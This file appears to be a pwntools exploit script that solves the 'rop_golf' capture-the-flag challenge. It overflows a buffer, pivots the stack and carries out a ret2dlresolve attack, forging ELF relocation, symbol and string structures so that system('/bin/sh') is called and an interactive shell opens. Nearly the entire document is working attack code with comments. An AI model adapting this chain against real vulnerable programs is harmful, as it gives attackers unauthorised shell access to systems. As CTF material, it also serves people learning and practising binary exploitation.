from pwn import *

#p = remote("tamuctf.com", 443, ssl=True, sni="rop-golf")
context.arch = "amd64"
context.log_level = "DEBUG"
p = process("./rop_golf")



def align(addr):
    return (0x18 - (addr) % 0x18)

RW_AREA = 0x404040 + 0x700
PLT = 0x401020 # .plt default stub
JMPREL = 0x4004a0 # .rela.plt section
SYMTAB = 0x400330 # .symtab section
STRTAB = 0x4003d8 # .strtab section

# Gadgets
pop_rdi = 0x4011fb # pop rdi; ret;
pop_rsi_r15 = 0x4011f9 # pop rsi; pop r15; ret;
leave_ret = 0x401161 # leave; ret;

plt_read = 0x401040
got_read = 0x404020

# Fake .rela.plt
fake_relaplt = RW_AREA + 0x20 # Right after reloc_arg
fake_relaplt += align(fake_relaplt - JMPREL) # Alignment in x64 is 0x18
reloc_arg = int(((fake_relaplt - JMPREL) / 0x18))

debug("Fake .rela.plt starts at: " + hex(fake_relaplt))
debug("reloc_arg is: " + hex(reloc_arg))
debug("Expected fake .rela.plt at: hex(reloc_arg*0x18 + JMPREL) => " + hex(reloc_arg*0x18 + JMPREL))
print("-"*80)

# Fake .symtab
fake_symtab = fake_relaplt + 0x18
fake_symtab += align(fake_symtab - SYMTAB) # Alignment in x64 is 0x18
r_info = (int((fake_symtab - SYMTAB) / 0x18) << 32) | 0x7 # | 0x7 to bypass check 4.

debug("Fake .symtab starts at: " + hex(fake_symtab))
debug("r_info is: " + hex(r_info))
debug("Expected fake .symtab at: hex(((r_info >> 32)*0x18) + SYMTAB) => " + hex(((r_info >> 32)*0x18) + SYMTAB)) # *0x18 because it's used as index
print("-"*80)

# Fake .strtab
fake_symstr = fake_symtab + 0x18
st_name = fake_symstr - STRTAB
bin_sh = fake_symstr + 0x8

debug("Fake .symstr starts at: " + hex(fake_symstr))
debug("st_name is: " + hex(st_name))
debug("Expected fake .strtab at: hex(STRTAB + st_name) => " + hex(STRTAB + st_name))
print("-"*80)

# STAGE 1:
# A second call to read() stores the fake structures on the RW_AREA.
# Then, we jump on RW_AREA using stack pivoting
# PS: rdx already contains 0x90, so we can avoid to use ret2csu
stage1 = b"A" * 32
stage1 += p64(RW_AREA) # We will pivot here using the leave_ret gadget
stage1 += p64(pop_rdi) + p64(0)
stage1 += p64(pop_rsi_r15) + p64(RW_AREA + 0x8) + p64(0)
stage1 += p64(plt_read) # read(0, RW_AREA + 0x8, 0x90)
stage1 += p64(leave_ret)
stage1 += b"X" * (72 - len(stage1))

# STAGE 2:
# We send the payload containing the fake structures
stage2 = p64(pop_rdi) + p64(bin_sh)
stage2 += p64(PLT)
stage2 += p64(reloc_arg)

# Fake Elf64_Rel
stage2 += p64(got_read) #r_offset
stage2 += p64(r_info) #r_info

# Align
stage2 += p64(0)*3

# Fake Elf64_Sym
stage2 += p32(st_name)
stage2 += p8(0x12) # st_info,
stage2 += p8(0)  # st_other -> 0x00, bypass check .5
stage2 += p16(0) # st_shndx
stage2 += p64(0) # st_value
stage2 += p64(0) # st_size

# Fake strings
stage2 += b"system\x00\x00"
stage2 += b"/bin/sh\x00"
stage2 += b"X" * (0x90 - len(stage2))

p.sendline(stage1 + stage2)
p.interactive()


p.interactive()
